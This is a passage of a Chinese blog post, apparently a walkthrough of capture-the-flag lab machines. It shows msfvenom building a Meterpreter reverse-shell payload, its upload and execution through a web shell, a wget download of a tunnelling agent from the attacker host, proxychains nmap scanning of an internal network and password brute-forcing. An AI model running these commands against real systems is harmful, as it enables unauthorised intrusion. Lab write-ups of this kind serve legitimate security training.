+<p>发现flag</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125194416869.png" alt="image-20240125194416869"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125194435846.png" alt="image-20240125194435846"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;the_game_is_on&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将其输入到8000端口进入下一阶段</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125194734592.png" alt="image-20240125194734592"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125194756771.png" alt="image-20240125194756771"></p>
+<p>提示存在数据库，内网ip在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.3-254</span><br></pre></td></tr></table></figure>
+
+<p>之间</p>
+<p>利用蚁剑查看linux版本和用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125195036478.png" alt="image-20240125195036478"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 7a6839781018 4.15.0-39-generic #42-Ubuntu SMP Tue Oct 23 15:48:01 UTC 2018 x86_64 Linux</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux 4.15 64位</span><br></pre></td></tr></table></figure>
+
+<p>利用kali制作病毒</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=192.168.56.102 lport=9999 -f elf &gt; cacaca.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125200455275.png" alt="image-20240125200455275"></p>
+<p>通过蚁剑将马上传到服务器</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125200938139.png" alt="image-20240125200938139"></p>
+<p>给与马执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod 777 cacaca.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125201154999.png" alt="image-20240125201154999"></p>
+<p>msf监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.56.102</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125201630056.png" alt="image-20240125201630056"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set lport 9999</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125201718923.png" alt="image-20240125201718923"></p>
+<p>利用蚁剑在靶机中执行马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cacaca.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125202020284.png" alt="image-20240125202020284"></p>
+<p>获得会话</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125202053475.png" alt="image-20240125202053475"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125202234109.png" alt="image-20240125202234109"></p>
+<p>查看用户</p>
+<p>kali挂代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_linux_x64 -lport 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125202605834.png" alt="image-20240125202605834"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125204145621.png" alt="image-20240125204145621"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125204416098.png" alt="image-20240125204416098"></p>
+<p>利用蚁剑给靶机下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:5555/agent_linux_x64</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125204748041.png" alt="image-20240125204748041"></p>
+<p>给予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./*</span><br></pre></td></tr></table></figure>
+
+<p>服务端生成连接节点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 192.168.56.102 -rport 3333</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125205341834.png" alt="image-20240125205341834"></p>
+<p>连接成功</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125205418545.png" alt="image-20240125205418545"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125205516028.png" alt="image-20240125205516028"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks 1090</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125205842612.png" alt="image-20240125205842612"></p>
+<p>检测内网有哪些ip存货</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap 172.17.0.3-254 -sV  -sT  -Pn  -T4 -p80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125210228687.png" alt="image-20240125210228687"></p>
+<p>发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.17.0.4:80</span><br></pre></td></tr></table></figure>
+
+<p>端口存活</p>
+<p>配置火狐代理</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125211025625.png" alt="image-20240125211025625"></p>
+<p>访问172.17.0.4:80</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125211058996.png" alt="image-20240125211058996"></p>
+<p>结果需要密码</p>
+<p>利用bp抓包爆破密码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125211921567.png" alt="image-20240125211921567"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125212457723.png" alt="image-20240125212457723"></p>
+<p>对密码进行爆破</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240125213547730.png" alt="image-20240125213547730"></p>
+<p>爆出密码为password</p>
+<h3 id="靶场4"><a href="#靶场4" class="headerlink" title="靶场4"></a>靶场4</h3><p>查看mac地址</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131140905245.png" alt="image-20240131140905245"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0</span><br><span class="line">ifup eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131141020193.png" alt="image-20240131141020193"></p>
+<p>查看ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>了解到靶机ip为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p>扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -T4 192.168.56.101 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131141218662.png" alt="image-20240131141218662"></p>
+<p>发现3个端口活着</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131142420141.png" alt="image-20240131142420141"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.56.101:8000</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131142442645.png" alt="image-20240131142442645"></p>
+<p>扫两个网站目录没有什么收获</p>
+<p>查看源代码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240131142556086.png" alt="image-20240131142556086"></p>
+<p>发现了一段很长的js代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<p>只有值部分加密了，其他部分没有加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "HBismw2vU6hg56PslAF2APW1-gzGzoHsz",
+        app_key: "k41e2BJYdNbojyHuMnKT5LBK",
+        placeholder: "留下你来过的痕迹~",
+        avatar:"robohash",
+    });
+</script>
+
+  </section>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <div class="widget-wrap-info">
+        <img src="/../img/avator.jpg" class="widget-wrap-info-img">
+        <div class="widget-wrap-info-author">lanceplm</div>
+        <div class="widget-wrap-info-signature">随遇而安。</div>
+    </div>
+    <div class="info-nav">
+        <ul class="info-nav-ul">
+        
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="home"></i>
+                    </span>
+                    <span class="info-nav-name">首页</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/archives">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="archive"></i>
+                    </span>
+                    <span class="info-nav-name">归档</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/about">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="alert-circle"></i>
+                    </span>
+                    <span class="info-nav-name">关于</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/board">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="edit-3"></i>
+                    </span>
+                    <span class="info-nav-name">留言</span>
+                </div>
+            </a>
+           </li>
+          
+        </ul>
+    </div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2024 lanceplm<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by  <a href="https://github.com/FuShaoLei/hexo-theme-hiya" target="_blank">Hiya</a>
+      
+        <br>
+        <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      <span id="busuanzi_container_site_uv">
+        访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+        
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/,home" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives,archive" class="mobile-nav-link">归档</a>
+  
+    <a href="/about,alert-circle" class="mobile-nav-link">关于</a>
+  
+    <a href="/board,edit-3" class="mobile-nav-link">留言</a>
+  
+</nav>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script>
+    feather.replace()
+</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
